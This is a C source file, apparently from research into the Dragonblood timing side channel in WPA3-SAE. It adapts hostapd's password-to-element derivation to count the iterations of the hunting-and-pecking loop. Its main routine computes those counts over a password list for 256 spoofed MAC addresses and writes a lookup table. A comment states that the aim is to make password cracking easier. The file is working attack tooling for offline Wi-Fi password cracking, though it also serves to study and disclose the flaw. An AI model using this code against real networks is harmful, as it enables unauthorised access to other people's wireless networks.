u8 order24[32] = {
    140, 248, 54, 66, 167, 9, 160, 151, 180, 71, 153, 118, 64, 18, 157, 162, 153, 177, 164, 125, 30, 179, 117, 11,
    163, 8, 176, 254, 100, 245, 251, 211
};

u8 prime24[256] = {
    135, 168, 230, 29, 180, 182, 102, 60, 255, 187, 209, 156, 101, 25, 89, 153, 140, 238, 246, 8, 102, 13, 208, 242,
    93, 44, 238, 212, 67, 94, 59, 0, 224, 13, 248, 241, 214, 25, 87, 212, 250, 247, 223, 69, 97, 178, 170, 48, 22,
    195, 217, 17, 52, 9, 111, 170, 59, 244, 41, 109, 131, 14, 154, 124, 32, 158, 12, 100, 151, 81, 122, 189, 90,
    138, 157, 48, 107, 207, 103, 237, 145, 249, 230, 114, 91, 71, 88, 192, 34, 224, 177, 239, 66, 117, 191, 123,
    108, 91, 252, 17, 212, 95, 144, 136, 185, 65, 245, 78, 177, 229, 155, 184, 188, 57, 160, 191, 18, 48, 127, 92,
    79, 219, 112, 197, 129, 178, 63, 118, 182, 58, 202, 225, 202, 166, 183, 144, 45, 82, 82, 103, 53, 72, 138, 14,
    241, 60, 109, 154, 81, 191, 164, 171, 58, 216, 52, 119, 150, 82, 77, 142, 246, 161, 103, 181, 164, 24, 37, 217,
    103, 225, 68, 229, 20, 5, 100, 37, 28, 202, 203, 131, 230, 180, 134, 246, 179, 202, 63, 121, 113, 80, 96, 38,
    192, 184, 87, 246, 137, 150, 40, 86, 222, 212, 1, 10, 189, 11, 230, 33, 195, 163, 150, 10, 84, 231, 16, 195,
    117, 242, 99, 117, 215, 1, 65, 3, 164, 181, 67, 48, 193, 152, 175, 18, 97, 22, 210, 39, 110, 17, 113, 95, 105,
    56, 119, 250, 215, 239, 9, 202, 219, 9, 74, 233, 30, 26, 21, 151
};

// Version of sae_derive_pwe_ffc with a little less code to save time and hopefully make password cracking easier, output is the same.
static u8 sae_derive_pwe_ffc_test(struct sae_data *sae, const u8 *addr1,
			      const u8 *addr2, const u8 *password,
			      size_t password_len) {
	u8 counter;
	u8 addrs[2 * ETH_ALEN];
	const u8 *addr[2];
	size_t len[2];
	u8 found = 0;
	struct crypto_bignum *pwe;
	size_t prime_len = sae->tmp->prime_len * 8;
	u8 *pwe_buf;

	crypto_bignum_deinit(sae->tmp->pwe_ffc, 1);
	sae->tmp->pwe_ffc = NULL;

	/* Allocate a buffer to maintain selected and candidate PWE for constant
	 * time selection. */
	pwe_buf = os_zalloc(prime_len * 2);
	pwe = crypto_bignum_init();
	if (!pwe_buf || !pwe)
		goto fail;

	wpa_hexdump_ascii_key(MSG_DEBUG, "SAE: password",
			      password, password_len);

	sae_pwd_seed_key(addr1, addr2, addrs);

	addr[0] = password;
	len[0] = password_len;
	addr[1] = &counter;
	len[1] = sizeof(counter);

	for (counter = 1; !found; counter++) {
		u8 pwd_seed[SHA256_MAC_LEN];

		if (counter > 200) {
			/* This should not happen in practice */
			wpa_printf(MSG_DEBUG, "SAE: Failed to derive PWE");
			break;
		}

		wpa_printf(MSG_DEBUG, "SAE: counter = %02u", counter);
		if (hmac_sha256_vector(addrs, sizeof(addrs), 2,
				       addr, len, pwd_seed) < 0)
			break;
		found = (u8)sae_test_pwd_seed_ffc(sae, pwd_seed, pwe);
		/* res is -1 for fatal failure, 0 if a valid PWE was not found,
		 * or 1 if a valid PWE was found. */
		if ((int)found < 0)
			break;
		/* Store the candidate PWE into the second half of pwe_buf and
		 * the selected PWE in the beginning of pwe_buf using constant
		 * time selection. */
		if (crypto_bignum_to_bin(pwe, pwe_buf + prime_len, prime_len,
					 prime_len) < 0)
			break;
		const_time_select_bin(found, pwe_buf, pwe_buf + prime_len,
				      prime_len, pwe_buf);
	}

	if (!found)
		goto fail;

	wpa_printf(MSG_DEBUG, "SAE: Use PWE from counter = %02u", counter);
	sae->tmp->pwe_ffc = crypto_bignum_init_set(pwe_buf, prime_len);
fail:
	crypto_bignum_deinit(pwe, 1);
	bin_clear_free(pwe_buf, prime_len * 2);
	return counter-1;
}

int main(int argc, char *argv[]) {
    if (argc != 3) {
        exit(1);
    }

    FILE *pas_fd = fopen(argv[1], "r");
    FILE *out_fd = fopen(argv[2], "w");

    const u8 addr1[6] = {0, 17, 0, 0, 0, 0}; // wlan0 target address 11 base 16 = 17 base 10
    u8 addr2[6] = {0, 51, 0, 0, 0, 0}; //dragontime address 33 base 16 = 51 base 10

    struct dh_group *my_dh_group = calloc(1, sizeof(struct dh_group));
    my_dh_group->prime = prime24;
    my_dh_group->prime_len = 256;
    my_dh_group->order = order24;
    my_dh_group->order_len = 32;

    struct sae_temporary_data *my_tmp = calloc(1, sizeof(struct sae_temporary_data));
    my_tmp->prime_len = 256; // 2048 bits
    my_tmp->order = crypto_bignum_init_set(order24, 32);
    my_tmp->prime = crypto_bignum_init_set(prime24, 256);
    my_tmp->dh = my_dh_group;

    struct sae_data *my_sae = calloc(1, sizeof(struct sae_data));
    my_sae->tmp = my_tmp;

    if (pas_fd != NULL) {
        char line[256];

        while (fgets(line, sizeof(line), pas_fd)) {
            const int address_num = 256;
            line[os_strlen(line) - 1] = '\0';
            fprintf(out_fd, "%s,", line);

            for (int j = 0; j < address_num; j++) {
                addr2[5] = j;
                const int iters = sae_derive_pwe_ffc_test(my_sae, addr1, addr2, (u8 *) line, os_strlen(line));
                fprintf(out_fd, " %u", iters);
                if (j < address_num - 1) fprintf(out_fd, ",");
            }

            fprintf(out_fd, "\n");
        }

        fclose(pas_fd);
    } else {
        fprintf(stderr, "Unable to open password file!\n");
    }

    return 0;
}
